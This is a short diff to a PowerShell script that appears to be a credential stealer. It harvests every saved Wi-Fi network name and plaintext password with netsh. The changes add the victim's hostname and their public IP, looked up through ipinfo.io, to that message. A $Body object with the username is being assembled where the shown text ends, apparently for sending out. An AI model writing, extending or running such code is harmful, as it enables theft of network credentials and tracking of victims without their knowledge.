@@ -1,4 +1,12 @@
 # ENG
+
+# Get the hostname of the machine
+$hostname = $(hostname)
+
+# Get the public IP address
+$publicIP = Invoke-RestMethod -Uri 'http://ipinfo.io/ip'
+
+# Get all Wi-Fi profiles and passwords
 $allProfiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
 $allContent = ""
 
@@ -8,6 +16,9 @@ foreach ($profile in $allProfiles) {
 
     $allContent += "SSID: " + $wlan + " | Password: " + $passw + "`n"
 }
+
+# Add hostname and public IP address to the message
+$allContent = "Hostname: " + $hostname + "`n" + "Public IP: " + $publicIP + "`n`n" + $allContent
 
 $Body = @{
     'username' = $env:USERNAME
